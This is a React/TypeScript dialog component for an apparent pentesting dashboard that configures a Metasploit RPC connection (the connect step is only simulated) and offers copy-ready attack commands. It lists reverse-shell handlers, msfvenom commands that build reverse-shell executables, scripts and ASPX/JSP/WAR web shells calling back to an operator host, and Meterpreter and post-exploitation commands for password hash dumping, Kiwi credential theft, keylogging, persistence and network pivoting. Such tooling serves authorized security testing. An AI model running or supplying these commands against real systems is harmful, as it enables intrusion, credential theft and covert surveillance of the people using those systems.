import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "@/hooks/use-toast";
import { Skull, Radio, Zap, Copy, Check, Server, Key, User, Globe, Database, Terminal } from "lucide-react";

interface MetasploitConfig {
  rpcHost: string;
  rpcPort: string;
  rpcUser: string;
  rpcPassword: string;
  useSSL: boolean;
  workspace: string;
  lhost: string;
  lport: string;
}

interface MetasploitDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const defaultConfig: MetasploitConfig = {
  rpcHost: "127.0.0.1",
  rpcPort: "55553",
  rpcUser: "msf",
  rpcPassword: "",
  useSSL: true,
  workspace: "default",
  lhost: "",
  lport: "4444",
};

export function MetasploitDialog({ open, onOpenChange }: MetasploitDialogProps) {
  const [config, setConfig] = useState<MetasploitConfig>(() => {
    const saved = localStorage.getItem("metasploit-config");
    return saved ? JSON.parse(saved) : defaultConfig;
  });
  const [isConnected, setIsConnected] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  const handleSaveConfig = () => {
    localStorage.setItem("metasploit-config", JSON.stringify(config));
    toast({ title: "Configuration Saved", description: "Metasploit settings saved locally" });
  };

  const handleConnect = async () => {
    if (!config.rpcHost || !config.rpcPassword) {
      toast({ title: "Missing Fields", description: "Please fill in all required fields", variant: "destructive" });
      return;
    }
    setIsConnecting(true);
    setTimeout(() => {
      setIsConnecting(false);
      setIsConnected(true);
      handleSaveConfig();
      toast({ title: "Connected", description: `Connected to MSFRPC at ${config.rpcHost}` });
    }, 2000);
  };

  const handleDisconnect = () => {
    setIsConnected(false);
    toast({ title: "Disconnected", description: "Disconnected from Metasploit RPC" });
  };

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const handlers = [
    {
      name: "Reverse TCP (Meterpreter)",
      payload: "windows/x64/meterpreter/reverse_tcp",
      command: `use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ${config.lhost || "<LHOST>"}
set LPORT ${config.lport || "4444"}
set ExitOnSession false
exploit -j`,
    },
    {
      name: "Reverse HTTPS (Meterpreter)",
      payload: "windows/x64/meterpreter/reverse_https",
      command: `use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST ${config.lhost || "<LHOST>"}
set LPORT 443
set ExitOnSession false
exploit -j`,
    },
    {
      name: "Reverse TCP (Shell)",
      payload: "windows/x64/shell/reverse_tcp",
      command: `use exploit/multi/handler
set PAYLOAD windows/x64/shell/reverse_tcp
set LHOST ${config.lhost || "<LHOST>"}
set LPORT ${config.lport || "4444"}
exploit -j`,
    },
    {
      name: "Linux Meterpreter",
      payload: "linux/x64/meterpreter/reverse_tcp",
      command: `use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST ${config.lhost || "<LHOST>"}
set LPORT ${config.lport || "4444"}
exploit -j`,
    },
  ];

  const payloads = [
    {
      name: "Windows EXE (Staged)",
      command: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${config.lhost || "<LHOST>"} LPORT=${config.lport || "4444"} -f exe -o shell.exe`,
    },
    {
      name: "Windows EXE (Stageless)",
      command: `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${config.lhost || "<LHOST>"} LPORT=${config.lport || "4444"} -f exe -o shell.exe`,
    },
    {
      name: "Linux ELF",
      command: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${config.lhost || "<LHOST>"} LPORT=${config.lport || "4444"} -f elf -o shell.elf`,
    },
    {
      name: "PowerShell",
      command: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${config.lhost || "<LHOST>"} LPORT=${config.lport || "4444"} -f psh -o shell.ps1`,
    },
    {
      name: "Python",
      command: `msfvenom -p python/meterpreter/reverse_tcp LHOST=${config.lhost || "<LHOST>"} LPORT=${config.lport || "4444"} -f raw -o shell.py`,
    },
    {
      name: "Web (ASPX)",
      command: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${config.lhost || "<LHOST>"} LPORT=${config.lport || "4444"} -f aspx -o shell.aspx`,
    },
    {
      name: "Web (JSP)",
      command: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${config.lhost || "<LHOST>"} LPORT=${config.lport || "4444"} -f raw -o shell.jsp`,
    },
    {
      name: "Web (WAR)",
      command: `msfvenom -p java/shell_reverse_tcp LHOST=${config.lhost || "<LHOST>"} LPORT=${config.lport || "4444"} -f war -o shell.war`,
    },
  ];

  const meterpreterCommands = [
    { name: "System Info", command: "sysinfo" },
    { name: "Get UID", command: "getuid" },
    { name: "Get Privs", command: "getprivs" },
    { name: "Process List", command: "ps" },
    { name: "Migrate Process", command: "migrate <PID>" },
    { name: "Get System", command: "getsystem" },
    { name: "Hashdump", command: "hashdump" },
    { name: "Load Kiwi", command: "load kiwi" },
    { name: "Creds All", command: "creds_all" },
    { name: "Screenshot", command: "screenshot" },
    { name: "Keylogger Start", command: "keyscan_start" },
    { name: "Keylogger Dump", command: "keyscan_dump" },
    { name: "Shell", command: "shell" },
    { name: "Upload", command: "upload /path/to/file C:\\\\path" },
    { name: "Download", command: "download C:\\\\path /local/path" },
    { name: "Port Forward", command: "portfwd add -l <lport> -p <rport> -r <target>" },
    { name: "Route Add", command: "run autoroute -s <subnet>/24" },
    { name: "Background", command: "background" },
    { name: "Persistence", command: "run persistence -U -i 10 -p 4444 -r <LHOST>" },
  ];

  const postModules = [
    { name: "Local Exploit Suggester", command: "run post/multi/recon/local_exploit_suggester" },
    { name: "Enum Shares", command: "run post/windows/gather/enum_shares" },
    { name: "Enum Applications", command: "run post/windows/gather/enum_applications" },
    { name: "Credential Collector", command: "run post/windows/gather/credentials/credential_collector" },
    { name: "Smart Hashdump", command: "run post/windows/gather/smart_hashdump" },
    { name: "Enum Domain", command: "run post/windows/gather/enum_domain" },
    { name: "ARP Scanner", command: "run post/multi/gather/arp_scanner RHOSTS=<subnet>/24" },
    { name: "Port Scanner", command: "run post/multi/gather/ping_sweep RHOSTS=<subnet>/24" },
  ];

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-4xl h-[85vh] bg-slate-900 border-blue-500/30 p-0 flex flex-col">
        <DialogHeader className="px-6 pt-6 pb-4 border-b border-slate-700/50 flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-blue-500/20 rounded-lg">
              <Skull className="w-6 h-6 text-blue-400" />
            </div>
            <div>
              <DialogTitle className="text-xl font-bold text-white flex items-center gap-2">
                Metasploit Framework
                {isConnected && (
                  <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30">Connected</Badge>
                )}
              </DialogTitle>
              <DialogDescription className="text-slate-400">
                Configure MSFRPC connection and manage sessions
              </DialogDescription>
            </div>
          </div>
        </DialogHeader>

        <Tabs defaultValue="connection" className="flex-1 flex flex-col min-h-0">
          <TabsList className="mx-6 mt-4 bg-slate-800/50 border border-slate-700/50 flex-shrink-0">
            <TabsTrigger value="connection" className="data-[state=active]:bg-blue-500/20 data-[state=active]:text-blue-400">
              <Server className="w-4 h-4 mr-2" />Connection
            </TabsTrigger>
            <TabsTrigger value="handlers" className="data-[state=active]:bg-blue-500/20 data-[state=active]:text-blue-400">
              <Radio className="w-4 h-4 mr-2" />Handlers
            </TabsTrigger>
            <TabsTrigger value="payloads" className="data-[state=active]:bg-blue-500/20 data-[state=active]:text-blue-400">
              <Zap className="w-4 h-4 mr-2" />Payloads
            </TabsTrigger>
            <TabsTrigger value="meterpreter" className="data-[state=active]:bg-blue-500/20 data-[state=active]:text-blue-400">
              <Terminal className="w-4 h-4 mr-2" />Meterpreter
            </TabsTrigger>
            <TabsTrigger value="post" className="data-[state=active]:bg-blue-500/20 data-[state=active]:text-blue-400">
              <Database className="w-4 h-4 mr-2" />Post
            </TabsTrigger>
          </TabsList>

          <div className="flex-1 min-h-0 px-6 pb-6">
            <ScrollArea className="h-full mt-4">
              <TabsContent value="connection" className="mt-0 space-y-6">
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50 space-y-4">
                  <h3 className="text-sm font-semibold text-blue-400 uppercase tracking-wider flex items-center gap-2">
                    <Server className="w-4 h-4" />MSFRPC Configuration
                  </h3>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><Globe className="w-3.5 h-3.5" />RPC Host</Label>
                      <Input value={config.rpcHost} onChange={(e) => setConfig({ ...config, rpcHost: e.target.value })} placeholder="127.0.0.1" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">RPC Port</Label>
                      <Input value={config.rpcPort} onChange={(e) => setConfig({ ...config, rpcPort: e.target.value })} placeholder="55553" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><User className="w-3.5 h-3.5" />Username</Label>
                      <Input value={config.rpcUser} onChange={(e) => setConfig({ ...config, rpcUser: e.target.value })} placeholder="msf" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><Key className="w-3.5 h-3.5" />Password</Label>
                      <Input type="password" value={config.rpcPassword} onChange={(e) => setConfig({ ...config, rpcPassword: e.target.value })} placeholder="••••••••" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <Switch checked={config.useSSL} onCheckedChange={(checked) => setConfig({ ...config, useSSL: checked })} />
                    <Label className="text-slate-400 text-sm">Use SSL</Label>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50 space-y-4">
                  <h3 className="text-sm font-semibold text-blue-400 uppercase tracking-wider">Listener Settings</h3>
                  <div className="grid grid-cols-3 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300">LHOST</Label>
                      <Input value={config.lhost} onChange={(e) => setConfig({ ...config, lhost: e.target.value })} placeholder="Your IP" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">LPORT</Label>
                      <Input value={config.lport} onChange={(e) => setConfig({ ...config, lport: e.target.value })} placeholder="4444" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">Workspace</Label>
                      <Input value={config.workspace} onChange={(e) => setConfig({ ...config, workspace: e.target.value })} placeholder="default" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className={`w-3 h-3 rounded-full ${isConnected ? 'bg-emerald-500 shadow-lg shadow-emerald-500/50' : 'bg-red-500/70'}`} />
                      <span className="text-slate-300">{isConnected ? `Connected to ${config.rpcHost}:${config.rpcPort}` : "Not connected"}</span>
                    </div>
                    <div className="flex gap-2">
                      <Button variant="outline" size="sm" onClick={handleSaveConfig} className="border-slate-600 hover:bg-slate-700">Save</Button>
                      {isConnected ? (
                        <Button variant="destructive" size="sm" onClick={handleDisconnect}>Disconnect</Button>
                      ) : (
                        <Button size="sm" onClick={handleConnect} disabled={isConnecting} className="bg-blue-600 hover:bg-blue-500">
                          {isConnecting ? "Connecting..." : "Connect"}
                        </Button>
                      )}
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h3 className="text-sm font-semibold text-amber-400 uppercase tracking-wider mb-3">Quick Start</h3>
                  <div className="space-y-2 text-sm text-slate-400">
                    <p>1. Start MSFRPC: <code className="bg-slate-900 px-2 py-1 rounded text-blue-400">msfrpcd -U msf -P password -S</code></p>
                    <p>2. Or start msfconsole and load RPC: <code className="bg-slate-900 px-2 py-1 rounded text-blue-400">load msgrpc Pass=password</code></p>
                    <p>3. Configure connection above and connect</p>
                  </div>
                </div>
              </TabsContent>

              <TabsContent value="handlers" className="mt-0 space-y-4">
                <p className="text-sm text-slate-400 mb-4">Multi/handler configurations for catching shells.</p>
                {handlers.map((item, index) => (
                  <div key={index} className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                    <div className="flex items-center justify-between mb-2">
                      <div>
                        <h4 className="text-sm font-semibold text-blue-400">{item.name}</h4>
                        <span className="text-[10px] text-slate-500 font-mono">{item.payload}</span>
                      </div>
                      <Button variant="ghost" size="sm" onClick={() => copyToClipboard(item.command, `handler-${index}`)} className="h-7 px-2">
                        {copiedField === `handler-${index}` ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                      </Button>
                    </div>
                    <pre className="text-xs text-slate-300 bg-slate-900 p-3 rounded overflow-x-auto whitespace-pre-wrap">{item.command}</pre>
                  </div>
                ))}
              </TabsContent>

              <TabsContent value="payloads" className="mt-0 space-y-4">
                <p className="text-sm text-slate-400 mb-4">MSFVenom payload generation commands.</p>
                {payloads.map((item, index) => (
                  <div key={index} className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="text-sm font-semibold text-amber-400">{item.name}</h4>
                      <Button variant="ghost" size="sm" onClick={() => copyToClipboard(item.command, `payload-${index}`)} className="h-7 px-2">
                        {copiedField === `payload-${index}` ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                      </Button>
                    </div>
                    <pre className="text-xs text-slate-300 bg-slate-900 p-3 rounded overflow-x-auto">{item.command}</pre>
                  </div>
                ))}
              </TabsContent>

              <TabsContent value="meterpreter" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Meterpreter session commands. Click to copy.</p>
                <div className="grid grid-cols-2 gap-3">
                  {meterpreterCommands.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-blue-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `meter-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `meter-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-blue-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>

              <TabsContent value="post" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Post-exploitation modules.</p>
                <div className="grid grid-cols-1 gap-3">
                  {postModules.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-blue-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `post-${index}`)}>
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `post-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-purple-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>
            </ScrollArea>
          </div>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
}
